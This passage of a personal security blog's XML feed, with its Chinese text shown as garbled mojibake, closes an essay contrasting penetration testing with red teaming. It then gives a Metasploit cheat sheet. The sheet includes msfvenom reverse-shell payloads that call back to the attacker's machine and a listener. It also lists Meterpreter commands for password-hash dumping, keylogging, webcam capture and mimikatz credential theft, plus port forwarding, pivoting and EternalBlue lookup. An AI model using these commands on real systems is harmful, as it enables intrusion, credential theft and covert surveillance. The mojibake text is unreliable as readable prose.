‡å¯èƒ½æ˜¯webç³»ç»Ÿã€å·¥ä¸šæ§åˆ¶ç½‘ç»œã€å†…éƒ¨åŠå…¬ç½‘ç»œç­‰ç­‰ã€‚å„ç±»ä¼—æµ‹å¹³å°ä¸Šçš„æµ‹è¯•ä»»åŠ¡æœ¬è´¨ä¸Šå°±æ˜¯æ¸—é€æµ‹è¯•ä»»åŠ¡ï¼Œè¿™äº›ä»»åŠ¡éƒ½ä¼šæ˜ç¡®æµ‹è¯•èŒƒå›´ï¼Œæ¯”å¦‚æŒ‡å®šwebç³»ç»ŸåŸŸåã€æŒ‡å®šæµ‹è¯•çš„APPç­‰ã€‚</p><p>ä¸€èˆ¬å®‰å…¨ä¼ä¸šæä¾›çš„æ¸—é€æµ‹è¯•æœåŠ¡é€šå¸¸å¯ä»¥åˆ†è§£æˆä¸€ç»„é’ˆå¯¹ä¸åŒç³»ç»Ÿçš„æµ‹è¯•ä»»åŠ¡ï¼Œå¦‚é’ˆå¯¹webç³»ç»Ÿçš„æµ‹è¯•ä»»åŠ¡ã€é’ˆå¯¹å†…éƒ¨åŠå…¬ç½‘çš„æµ‹è¯•ä»»åŠ¡ã€ç¤¾ä¼šå·¥ç¨‹å­¦æµ‹è¯•ä»»åŠ¡ç­‰ç­‰ã€‚</p><p>æ¸—é€æµ‹è¯•åœ¨è¯„ä¼°ç³»ç»Ÿæˆ–ç½‘ç»œçš„å®‰å…¨æ€§æ—¶ï¼Œé€šå¸¸ä¼šå¿½ç•¥ä¼ä¸šé‡Œå…¶ä»–è¿è¡Œç¯å¢ƒçš„å®‰å…¨é™åˆ¶ã€‚ä¾‹å¦‚ï¼Œå†…ç½‘æ¸—é€æµ‹è¯•å°†ä»å†…ç½‘ä¸­æ¶æ„ç”¨æˆ·ï¼ˆä¾‹å¦‚æ¶æ„å‘˜å·¥æˆ–è¢«å…¥ä¾µçš„å‘˜å·¥æœºå™¨ï¼‰çš„è§’åº¦è¯„ä¼°ä¼ä¸šçš„ç½‘ç»œå®‰å…¨æ€§ã€‚æµ‹è¯•å·¥ç¨‹å¸ˆåˆ°è¾¾ç°åœºåï¼Œå°†ä¼šç›´æ¥å°†ç¬”è®°æœ¬ç”µè„‘æ¥å…¥å†…éƒ¨åŠå…¬ç½‘ç»œå¼€å§‹è¿›è¡Œæµ‹è¯•ã€‚å†…ç½‘æ¸—é€æµ‹è¯•ä¼šå¿½ç•¥é»‘å®¢åœ¨å†…ç½‘ä¸­è·å¾—åˆå§‹è½è„šç‚¹è¿™ä¸ªæ­¥éª¤(é€šå¸¸æ˜¯é€šè¿‡é’“é±¼é‚®ä»¶æˆ–å…¶ä»–æ–¹å¼æ¬ºéª—å‘˜å·¥è¿è¡Œæ¶æ„ç¨‹åº)ï¼Œç›´æ¥ä»å·²æœ‰å†…ç½‘æ¥å…¥æƒé™å¼€å§‹è¿›è¡Œæµ‹è¯•ã€‚å†…ç½‘æµ‹è¯•æŠ¥å‘Šä¼šåŒ…å«å†…ç½‘ä¸­æš´éœ²çš„æœ‰æ¼æ´çš„æœåŠ¡ã€æœªæ‰“è¡¥ä¸çš„ç³»ç»Ÿã€é”™è¯¯çš„ç³»ç»Ÿé…ç½®ã€æ•æ„Ÿæ–‡ä»¶å…±äº«ç­‰ç­‰å®‰å…¨é—®é¢˜ï¼Œä½†æ˜¯ä¸ä¼šåŒ…å«é»‘å®¢æœ€åˆå¦‚ä½•è·å–å†…ç½‘æ¥å…¥æƒé™è¿™ä¸ªæ­¥éª¤ã€‚</p><p>åœ¨æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œä¼ä¸šä¸­è´Ÿè´£é˜²æŠ¤çš„å®‰å…¨å›¢é˜Ÿä¸€èˆ¬ä¸ä¼šç›´æ¥å‚ä¸ï¼Œä¸ºäº†é…åˆæ¸—é€æµ‹è¯•ï¼Œä¼ä¸šæœ‰æ—¶ä¼šå…³é—­æŸäº›å®‰å…¨é˜²æŠ¤è½¯ä»¶æˆ–ç¦ç”¨å®‰å…¨ç­–ç•¥ï¼Œæ–¹ä¾¿æµ‹è¯•å·¥ç¨‹å¸ˆæ‰¾å‡ºæ›´å¤šçš„å®‰å…¨æ¼æ´ã€‚</p><p>å½“æ•´ä¸ªæ¸—é€æµ‹è¯•æ´»åŠ¨ç»“æŸåï¼Œå·¥ç¨‹å¸ˆä¼šå‡ºå…·ä¸€ä»½æ¸—é€æµ‹è¯•æŠ¥å‘Šï¼Œé‡Œé¢åŒ…å«æ‰€æœ‰å‘ç°çš„æ¼æ´åˆ—è¡¨ä»¥åŠæ¯ä¸ªæ¼æ´å…·ä½“çš„åˆ©ç”¨æ­¥éª¤å’Œè¿‡ç¨‹ï¼ŒåŒæ—¶ä¼šä¾æ®æ¼æ´å±å®³ç»™å‡ºç›¸åº”çš„å¨èƒç­‰çº§è¯„åˆ†ã€‚</p><h2 id="çº¢é˜Ÿ"><a href="#çº¢é˜Ÿ" class="headerlink" title="çº¢é˜Ÿ"></a>çº¢é˜Ÿ</h2><p>å°½ç®¡çº¢é˜Ÿæµ‹è¯•åœ¨æœ‰äº›æ”»å‡»æŠ€æœ¯æ–¹é¢ç±»ä¼¼æ¸—é€æµ‹è¯•ï¼Œä½†ä¸åŒäºæ¸—é€æµ‹è¯•å°½é‡å¤šæ‰¾æ¼æ´çš„ç›®æ ‡ï¼Œçº¢é˜Ÿæµ‹è¯•çš„ä»»åŠ¡å¾€å¾€æ˜¯æ‹¿ä¸‹æŸä¸ªç‰¹å®šçš„ä¸šåŠ¡ç›®æ ‡(æ¯”å¦‚å…¬å¸æŸä¸ªé¡¹ç›®çš„æºä»£ç ï¼Œå…¬å¸ç«æ ‡æ ‡ä¹¦å’Œåº•ä»·ç­‰å•†ä¸šæœºå¯†ï¼ŒæŸä¸ªé«˜å±‚ç®¡ç†äººå‘˜çš„é‚®ç®±æˆ–ä¸ªäººæœºç­‰) ã€‚çº¢é˜Ÿè¦æ¨¡æ‹ŸçœŸå®ä¸–ç•Œä¸­çš„æå…·ç›®çš„æ€§ä¸”ä¸å¸Œæœ›è¢«æ£€æµ‹åˆ°çš„æ¶æ„æ”»å‡»è€…ï¼ˆå—ç«äº‰å¯¹æ‰‹é›‡ä½£çš„æ¶æ„é»‘å®¢ï¼Œæ”¶é›†æ”¿æ²»ã€ç»æµå’Œç§‘æŠ€æƒ…æŠ¥çš„å¢ƒå¤–å›½å®¶èµ„åŠ©çš„é»‘å®¢å›¢ä¼™ç­‰ï¼‰ï¼Œçº¢é˜Ÿæµ‹è¯•æŸç§ç¨‹åº¦ä¸Šå¯ä»¥è¯´æ˜¯åˆæ³•çš„é«˜çº§æŒç»­æ€§å¨èƒ(APT)ã€‚åœ¨è¿™ç§å®Œå…¨è´´è¿‘çœŸå®æ”»å‡»çš„æµ‹è¯•æ´»åŠ¨ä¸­ï¼Œèƒ½å¤Ÿæµ‹è¯•ä¼ä¸šå®‰å…¨é˜²æŠ¤ä½“ç³»çš„é˜»æ–­ï¼ˆpreventionï¼‰ã€æ£€æµ‹ï¼ˆdetectionï¼‰å’Œå“åº”ï¼ˆresponseï¼‰èƒ½åŠ›ã€‚</p><p>æ¸—é€æµ‹è¯•ä¸­åªå…³æ³¨ç»™å®šç›®æ ‡ç³»ç»Ÿçš„æ¼æ´ï¼Œçº¢é˜Ÿæµ‹è¯•åˆ™å®Œå…¨ä¸ä¸€æ ·ã€‚çº¢é˜Ÿåœ¨æµ‹è¯•è¿‡ç¨‹ä¸­å…³æ³¨çš„æ˜¯å¦‚ä½•è§„åˆ’ä¸€æ¡æ”»å‡»è·¯å¾„æ¥è¾¾åˆ°ç›®çš„ã€‚åœ¨æ•´ä¸ªçº¢é˜Ÿæµ‹è¯•è¿‡ç¨‹ä¸­ä¸ä¸€å®šè¦ä¹Ÿä¸ä¸€å®šä¼šå‘ç°ç›®æ ‡ç»„ç»‡çš„æ¼æ´ï¼Œåªè¦èƒ½è¾¾åˆ°ç›®çš„ï¼Œä»»ä½•å½¢å¼çš„æ”»å‡»æ‰‹æ®µéƒ½å¯ä»¥ä½¿ç”¨ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºwebæˆ–è€…æ“ä½œç³»ç»Ÿæ¼æ´ã€ç¤¾ä¼šå·¥ç¨‹å­¦ã€ç‰©ç†æ¸—é€ã€æ”»å‡»ä¸Šä¸‹æ¸¸åˆä½œä¾›åº”å•†ç­‰ã€‚</p><p>åœ¨çº¢é˜Ÿæµ‹è¯•å¼€å§‹å‰ï¼Œé™¤äº†ä»»åŠ¡ç›®æ ‡å¤–ï¼Œä¸ä¼šç»™åˆ°çº¢é˜Ÿå…³äºç›®æ ‡ä¼ä¸šçš„ä»»ä½•å…¶ä»–ä¿¡æ¯ã€‚çº¢é˜Ÿéœ€è¦é€šè¿‡å„ç§æ¸ é“å»æœé›†ç›®æ ‡çš„ç‰©ç†ä½ç½®ã€å…¬å¼€çš„ç½‘ç»œç³»ç»Ÿå’ŒæœåŠ¡ã€ç»„ç»‡æ¶æ„ä»¥åŠé›‡å‘˜ç­‰ä¿¡æ¯ï¼Œç„¶åæ ¹æ®æ”¶é›†çš„ä¿¡æ¯åˆ¶å®šæ”»å‡»è®¡åˆ’å¹¶å®æ–½ã€‚è¢«æµ‹ä¼ä¸šå¹¶ä¸æ¸…æ¥šï¼ˆæˆ–ä»…æœ‰å°‘æ•°äººæ¸…æ¥šï¼‰æ”»å‡»å°†äºä½•æ—¶å‘èµ·ï¼Œå°†ä»¥ä½•ç§æ–¹å¼è¿›è¡Œã€‚çº¢é˜Ÿæµ‹è¯•çš„æŒç»­æ—¶é—´ä¸€èˆ¬æ¯”æ¸—é€æµ‹è¯•æ›´é•¿ï¼Œå¯ä»¥è¾¾åˆ°4åˆ°6å‘¨ç”šè‡³æ›´é•¿ï¼ˆæƒ³æƒ³çœ‹çœŸå®APTæ”»å‡»ä¸­é•¿è¾¾æ•°æœˆçš„æ½œä¼å’ŒæŒç»­æ¸—é€ï¼‰ã€‚</p><p>çº¢é˜Ÿåœ¨å®æ–½æ”»å‡»æ—¶ï¼Œä¼šå°½é‡éšè—è‡ªå·±çš„è¸ªè¿¹ï¼Œå¦å¤–è¿˜ä¼šè¯¦ç»†è®°å½•æ¯ä¸ªæ”»å‡»è¡Œä¸ºçš„å…·ä½“å®æ–½æ—¶é—´ï¼Œåœ¨æ•´ä¸ªè¡ŒåŠ¨ç»“æŸåéœ€è¦ä¸ç»„ç»‡ä¸­çš„é˜²å¾¡æ£€æµ‹éƒ¨é—¨(å³è“é˜Ÿ)çš„æ£€æµ‹å“åº”æ—¶é—´è¡¨è¿›è¡Œæ ¸å¯¹ï¼Œä»¥æ­¤æ¥è¯„ä¼°é˜²å¾¡æ£€æµ‹æœºåˆ¶çš„æœ‰æ•ˆæ€§å’Œå“åº”é€Ÿåº¦ï¼ŒåŒæ—¶æ£€æŸ¥è“é˜Ÿåœ¨å“ªäº›æ–¹é¢å­˜åœ¨æ¼æŠ¥å’Œå“åº”ä¸åŠæ—¶ï¼Œå¸®åŠ©è“é˜Ÿæ›´å¥½çš„å‘ç°é˜²å¾¡æ£€æµ‹å±‚é¢çš„å¼±ç‚¹ã€‚è¿™ä¸€ç‚¹CSåšçš„å¾ˆå¥½ï¼Œå¯ä»¥å¯¼å‡ºçº¢é˜Ÿçš„è¯¦ç»†æ“ä½œæ—¥å¿—å’Œæ—¶é—´ã€‚</p><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>ä¸¤è€…å¹¶æ²¡æœ‰å“ªä¸ªæ›´å¥½ä¹‹è¯´ï¼Œå¯¹äºä¼ä¸šæ¥è®²ï¼Œå…ˆè¦ææ¸…æ¥šå…·ä½“çš„åœºæ™¯å’Œå®‰å…¨éœ€æ±‚ï¼Œæ‰èƒ½ç¡®å®šéœ€è¦çš„æ˜¯æ¸—é€æµ‹è¯•è¿˜æ˜¯çº¢é˜Ÿæµ‹è¯•ã€‚å¯¹äºæ–°ä¸Šçº¿çš„ä¸šåŠ¡ç³»ç»Ÿï¼Œéœ€è¦ææ¸…æ¥šå­˜åœ¨é‚£äº›æ¼æ´ä»¥åŠæ¼æ´å¯èƒ½é€ æˆçš„å±å®³æ—¶ï¼Œéœ€è¦çš„æ˜¯æ¸—é€æµ‹è¯•ï¼›å¦‚æœä¼ä¸šå„ä¸ªå­ç³»ç»Ÿéƒ½å·²ç»è¿›è¡Œè¿‡æ¸—é€æµ‹è¯•ï¼Œå¹¶ä¸”å­˜åœ¨æˆç†Ÿçš„æ¼æ´ç®¡ç†ã€é˜²å¾¡æ£€æµ‹ä»¥åŠåº”æ€¥å“åº”æœºåˆ¶ï¼Œå¦å¤–è¿˜æƒ³è¦å¯¹ä¼ä¸šæ•´ä½“å®‰å…¨ç¯å¢ƒè¿›è¡Œè¯„ä¼°ï¼Œäº†è§£ä¼ä¸šåœ¨é¢ä¸´çœŸæ­£çš„å®‰å…¨æ”»å‡»äº‹ä»¶æ—¶ï¼Œæ˜¯å¦æœ‰èƒ½åŠ›é˜²å¾¡æˆ–è€…æ£€æµ‹å¹¶åŠæ—¶å“åº”ï¼Œé‚£ä¹ˆéœ€è¦çš„ä¾¿æ˜¯çº¢é˜Ÿè¯„ä¼°ã€‚</p><p>æœ€åè¯´ä¸€ç‚¹ï¼Œåœ¨å¾ˆå¤šäººçš„è®¤çŸ¥é‡Œé¢ï¼Œä¸€ä¸ªä¼ä¸šè¢«æ”»ç ´ä¸€å®šæ˜¯å› ä¸ºå­˜åœ¨å®‰å…¨æ¼æ´æˆ–è€…é…ç½®é”™è¯¯ä¹‹ç±»çš„å®‰å…¨é—®é¢˜ï¼Œè¿™æ˜¯ä¸æ­£ç¡®çš„ã€‚å¦‚æœçœŸè¿™ä¹ˆç®€å•ï¼Œé‚£åªè¦æŒ‰æ—¶æ‰“è¡¥ä¸ï¼Œå°±èƒ½é˜²ä½æ‰€æœ‰æ²¡æœ‰0dayçš„æ¶æ„é»‘å®¢ç”šè‡³é˜²ä½APTæ”»å‡»äº†ã€‚ä¸Šæ–‡å·²ç»è¯´è¿‡ï¼Œçº¢é˜Ÿæµ‹è¯•è¿‡ç¨‹ä¸­ä¸ä¸€å®šä¼šå‘ç°å®‰å…¨æ¼æ´ï¼Œå¾ˆå¤šæ—¶å€™ä¸éœ€è¦å®‰å…¨æ¼æ´å°±èƒ½æ‰“ç©¿ä¸€ä¸ªä¼ä¸šã€‚è€Œç°ä»Šçš„å®‰å…¨å¸‚åœºï¼Œå¾ˆå¤šä¼ä¸šè¿˜æ˜¯ä»¥æ¼æ´æ•°é‡æ¥è¯„å®šå®‰å…¨æœåŠ¡å›¢é˜Ÿçš„èƒ½åŠ›ï¼Œå°±å¯¼å‡ºç°äº†å¾ˆå¤šå®‰å…¨æœåŠ¡æŠ¥å‘Šç¡¬å‡‘æ¼æ´æ•°é‡çš„æ€ªè±¡ã€‚åœ¨è¿™ç§å¤§ç¯å¢ƒä¸‹ï¼Œä¼ä¸šå¯èƒ½åè€Œè®¤ä¸ºæ²¡æœ‰å‘ç°å®‰å…¨æ¼æ´ä½†æ‰“ç©¿äº†ä»–ä»¬çš„çº¢é˜Ÿå®‰å…¨èƒ½åŠ›ä¸è¡Œï¼Œæˆ–è€…è®¤ä¸ºçº¯ç²¹æ˜¯å¶ç„¶ä¾¥å¹¸æ‰èƒ½å¾—æ‰‹ã€‚è¿™æ˜¯ä¸€ä¸ªè®¤çŸ¥å‡çº§çš„è¿‡ç¨‹ï¼Œä»€ä¹ˆæ—¶å€™èƒ½ä¸ä»¥æ¼æ´æ•°é‡æ¥è¯„å®šå®‰å…¨æœåŠ¡èƒ½åŠ›ï¼Œæ‰èƒ½è¯´çœŸæ­£ç†è§£äº†å®‰å…¨å’Œæ”»å‡»ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> åè¯æ¦‚å¿µ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSFå¸¸ç”¨å‘½ä»¤</title>
      <link href="/2023/07/11/MSF/"/>
      <url>/2023/07/11/MSF/</url>
      
        <content type="html"><![CDATA[<h1 id="åŸºæœ¬æ­¥éª¤"><a href="#åŸºæœ¬æ­¥éª¤" class="headerlink" title="åŸºæœ¬æ­¥éª¤"></a><strong>åŸºæœ¬æ­¥éª¤</strong></h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search xxx<span class="comment"># æœç´¢æŸä¸ªæ¨¡å—</span></span><br><span class="line">use xxx<span class="comment"># ä½¿ç”¨æŸä¸ªæ¨¡å—</span></span><br><span class="line">show options<span class="comment"># æŸ¥çœ‹é…ç½®é€‰é¡¹</span></span><br><span class="line"><span class="built_in">set</span> payload<span class="comment"># é…ç½®æ”»å‡»è½½è·</span></span><br><span class="line">run/exploit<span class="comment"># æ‰§è¡Œæ¸—é€æ”»å‡»</span></span><br></pre></td></tr></table></figure><h1 id="æœ¨é©¬ç”Ÿæˆ"><a href="#æœ¨é©¬ç”Ÿæˆ" class="headerlink" title="æœ¨é©¬ç”Ÿæˆ"></a>æœ¨é©¬ç”Ÿæˆ</h1><p>Winodws</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kaliçš„IP LPORT=Kaliç›‘å¬ç«¯å£ -f exe &gt; msf.exe</span><br><span class="line"></span><br><span class="line">å‚æ•°é€‰é¡¹ï¼š</span><br><span class="line">-pæŒ‡å®šçš„payload</span><br><span class="line">-e ç¼–ç å™¨ï¼Œx86/shikata_ga_nai</span><br><span class="line">-iè¿­ä»£å™¨ï¼Œå¯¹æœ‰æ•ˆè½½è·çš„ç¼–ç æ¬¡æ•°</span><br><span class="line">-fè¾“å‡ºæ–‡ä»¶çš„æ ¼å¼,exeã€dllã€raw</span><br></pre></td></tr></table></figure><p>Linux</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=Kaliçš„IP LPORT=Kaliç›‘å¬ç«¯å£ -f elf &gt; msf.elf</span><br><span class="line"><span class="built_in">chmod</span> +x ./msf.elf <span class="comment"># ä¸ºæœ¨é©¬æ·»åŠ æ‰§è¡Œæƒé™</span></span><br></pre></td></tr></table></figure><p>MSFç›‘å¬</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp <span class="comment"># è®¾ç½®çš„payloadè¦ä¸€è‡´ï¼Œä¸ç„¶è¿ä¸ä¸Š</span></span><br><span class="line"><span class="built_in">set</span> LHOST Kaliçš„IP</span><br><span class="line"><span class="built_in">set</span> LPORT Kaliç›‘å¬ç«¯å£</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h1 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h1><h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>ã€<span class="built_in">ls</span>ã€<span class="built_in">cd</span></span><br><span class="line">getuid<span class="comment"># æŸ¥çœ‹å½“å‰æƒé™</span></span><br><span class="line">getsystem<span class="comment"># è·å¾—ç³»ç»Ÿç®¡ç†å‘˜æƒé™ï¼ˆè¦æœ¬åœ°ç®¡ç†å‘˜æƒé™è¿è¡Œï¼‰</span></span><br><span class="line">hashdump<span class="comment"># æŠ“å“ˆå¸Œå¯†ç </span></span><br><span class="line">sysinfo<span class="comment"># æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯</span></span><br><span class="line">idletim     <span class="comment"># æŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿå·²è¿è¡Œæ—¶é—´</span></span><br><span class="line">route<span class="comment"># æŸ¥çœ‹ç›®æ ‡æœºå®Œæ•´ç½‘ç»œè®¾ç½®</span></span><br><span class="line">shell<span class="comment"># è¿›å…¥ç›®æ ‡æœºshellï¼Œexité€€å‡ºshe</span></span><br><span class="line">background<span class="comment"># å°†meterpreteréšè—åœ¨åå°</span></span><br><span class="line"></span><br><span class="line">upload ./1.txt c:\\1.txt<span class="comment"># ä¸Šä¼ æ–‡ä»¶</span></span><br><span class="line">download c:\1.txt ./<span class="comment"># ä¸‹è½½æ–‡ä»¶</span></span><br><span class="line">search -f *.txt -d c://<span class="comment"># æœç´¢æ–‡ä»¶</span></span><br><span class="line"></span><br><span class="line">keyscan_start<span class="comment"># å¯åŠ¨é”®ç›˜è®°å½•</span></span><br><span class="line">keyscan_stop<span class="comment"># åœæ­¢é”®ç›˜è®°å½•</span></span><br><span class="line">keyscan_dump<span class="comment"># è½¬å‚¨é”®ç›˜è®°å½•çš„å†…å®¹</span></span><br><span class="line">screenshot<span class="comment"># æŠ“å–æˆªå±</span></span><br><span class="line">webcam_list<span class="comment"># æ‘„åƒå¤´åˆ—è¡¨</span></span><br><span class="line">webcam_snap<span class="comment"># æ‘„åƒå¤´æ‹ç…§</span></span><br><span class="line">webcam_stream<span class="comment"># æŠ“å–è§†é¢‘</span></span><br></pre></td></tr></table></figure><h2 id="è¿›ç¨‹è¿ç§»"><a href="#è¿›ç¨‹è¿ç§»" class="headerlink" title="è¿›ç¨‹è¿ç§»"></a>è¿›ç¨‹è¿ç§»</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps | grep <span class="string">&quot;explore&quot;</span></span><br><span class="line">migrate pid <span class="comment"># å°†shellè¿ç§»åˆ°explorer.exeè¿›ç¨‹ä¸­</span></span><br></pre></td></tr></table></figure><h2 id="ä¼šè¯ç®¡ç†"><a href="#ä¼šè¯ç®¡ç†" class="headerlink" title="ä¼šè¯ç®¡ç†"></a><strong>ä¼šè¯ç®¡ç†</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">background<span class="comment"># å°†å½“å‰ä¼šè¯æ”¾ç½®åå°</span></span><br><span class="line">sessions<span class="comment"># ä¼šè¯ç®¡ç†</span></span><br><span class="line">sessions -l<span class="comment"># åˆ—å‡ºæ‰€æœ‰ä¼šè¯</span></span><br><span class="line">sessions -K<span class="comment"># ç»ˆæ­¢æ‰€æœ‰ä¼šè¯</span></span><br><span class="line">sessions -i <span class="built_in">id</span><span class="comment"># è¿›å…¥æŸä¸ªä¼šè¯</span></span><br></pre></td></tr></table></figure><h2 id="ä¼šè¯æ´¾ç”Ÿåˆ°CS"><a href="#ä¼šè¯æ´¾ç”Ÿåˆ°CS" class="headerlink" title="ä¼šè¯æ´¾ç”Ÿåˆ°CS"></a>ä¼šè¯æ´¾ç”Ÿåˆ°CS</h2><p>CSåˆ›å»ºç›‘å¬å™¨</p><p><img src="/../images/image-20231014203804586.png" alt="image-20231014203804586"></p><p>MSF</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/payload_inject</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.32.102       </span><br><span class="line"><span class="built_in">set</span> lport 9999               </span><br><span class="line"><span class="built_in">set</span> DisablePayloadHandler True</span><br><span class="line"><span class="built_in">set</span> PrependMigrate True</span><br><span class="line">sessions -l   </span><br><span class="line"><span class="built_in">set</span> session 1 </span><br><span class="line">run     </span><br></pre></td></tr></table></figure><p>æ²¡æˆåŠŸï¼Œå¼¹äº†ä¸ªè®°äº‹æœ¬ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230330143036863-1686283281461.png" alt="image-20230330143036863"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">creds_allï¼šåˆ—ä¸¾æ‰€æœ‰å‡­æ®</span><br><span class="line">creds_kerberosï¼šåˆ—ä¸¾æ‰€æœ‰kerberoså‡­æ®</span><br><span class="line">creds_msvï¼šåˆ—ä¸¾æ‰€æœ‰msvå‡­æ®</span><br><span class="line">creds_sspï¼šåˆ—ä¸¾æ‰€æœ‰sspå‡­æ®</span><br><span class="line">creds_tspkgï¼šåˆ—ä¸¾æ‰€æœ‰tspkgå‡­æ®</span><br><span class="line">creds_wdigestï¼šåˆ—ä¸¾æ‰€æœ‰wdigestå‡­æ®</span><br><span class="line">dcsyncï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·ä¿¡æ¯</span><br><span class="line">dcsync_ntlmï¼šé€šè¿‡DCSyncæ£€ç´¢ç”¨æˆ·å¸æˆ·NTLMæ•£åˆ—ã€SIDå’ŒRID</span><br><span class="line">golden_ticket_createï¼šåˆ›å»ºé»„é‡‘ç¥¨æ®</span><br><span class="line">kerberos_ticket_listï¼šåˆ—ä¸¾kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_purgeï¼šæ¸…é™¤kerberosç¥¨æ®</span><br><span class="line">kerberos_ticket_useï¼šä½¿ç”¨kerberosç¥¨æ®</span><br><span class="line">lsa_dump_samï¼šdumpå‡ºlsaçš„SAM</span><br><span class="line">lsa_dump_secretsï¼šdumpå‡ºlsaçš„å¯†æ–‡</span><br><span class="line">password_changeï¼šä¿®æ”¹å¯†ç </span><br><span class="line">wifi_listï¼šåˆ—å‡ºå½“å‰ç”¨æˆ·çš„wifié…ç½®æ–‡ä»¶</span><br><span class="line">wifi_list_sharedï¼šåˆ—å‡ºå…±äº«wifié…ç½®æ–‡ä»¶/ç¼–ç </span><br></pre></td></tr></table></figure><h5 id="è°ƒç”¨mimikatz"><a href="#è°ƒç”¨mimikatz" class="headerlink" title="è°ƒç”¨mimikatz"></a>è°ƒç”¨mimikatz</h5><blockquote><p>åœ¨å®‰è£…äº†KB2871997è¡¥ä¸æˆ–è€…ç³»ç»Ÿç‰ˆæœ¬å¤§äºwindows server 2012æ—¶ï¼Œç³»ç»Ÿçš„å†…å­˜ä¸­å°±ä¸å†ä¿å­˜æ˜æ–‡çš„å¯†ç ï¼Œè¿™æ ·åˆ©ç”¨mimikatzå°±ä¸èƒ½ä»å†…å­˜ä¸­è¯»å‡ºæ˜æ–‡å¯†ç äº†ã€‚mimikatzçš„ä½¿ç”¨éœ€è¦administratorç”¨æˆ·æ‰§è¡Œï¼Œadministratorsä¸­çš„å…¶ä»–ç”¨æˆ·éƒ½ä¸è¡Œã€‚</p></blockquote><p><a href="https://tttang.com/archive/1616/">mimikatzå‘½ä»¤</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kiwi_cmd module::xxx</span><br><span class="line">kiwi_cmd sekurlsa::wdigest</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswod</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230324153358300-1686283281461.png" alt="image-20230324153358300"></p><h2 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 <span class="comment">#å°†ç›®æ ‡æœºçš„3389ç«¯å£è½¬å‘åˆ°æœ¬åœ°6666ç«¯å£</span></span><br></pre></td></tr></table></figure><h2 id="éš§é“ä»£ç†"><a href="#éš§é“ä»£ç†" class="headerlink" title="éš§é“ä»£ç†"></a>éš§é“ä»£ç†</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run autoroute -s 192.168.52.0/24 <span class="comment"># ä¸ºå½“å‰sesisonæ·»åŠ è·¯ç”±</span></span><br><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy <span class="comment"># socks5ä»£ç†</span></span><br><span class="line"><span class="built_in">set</span> SRVHOST 127.0.0.1</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">é…ç½®proxychainsä½¿ç”¨è¯¥socks5ä»£ç†</span><br></pre></td></tr></table></figure><h2 id="æ°¸æ’ä¹‹è“"><a href="#æ°¸æ’ä¹‹è“" class="headerlink" title="æ°¸æ’ä¹‹è“"></a>æ°¸æ’ä¹‹è“</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_ms17_010 <span class="comment"># æ‰«ææ¨¡å—</span></span><br><span class="line">search exploit ms17_010 <span class="comment"># æŸ¥æ‰¾exp</span></span><br></pre></td></tr></table></figure><h1 id="æ›´å¤š"><a href="#æ›´å¤š" class="headerlink" title="æ›´å¤š"></a>æ›´å¤š</h1><p><a href="https://tttang.com/archive/1432/">MSFæ¸—é€å¸¸ç”¨æ“ä½œæŒ‡å— - è·³è·³ç³– (tttang.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> å·¥å…·ä½¿ç”¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqlæ³¨å…¥è¯¦è§£--Mysql</title>
      <link href="/2023/06/26/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/06/26/Web%E5%AE%89%E5%85%A8%E4%B9%8BMysql%E6%B3%A8%E5%85%A5/</url>
      
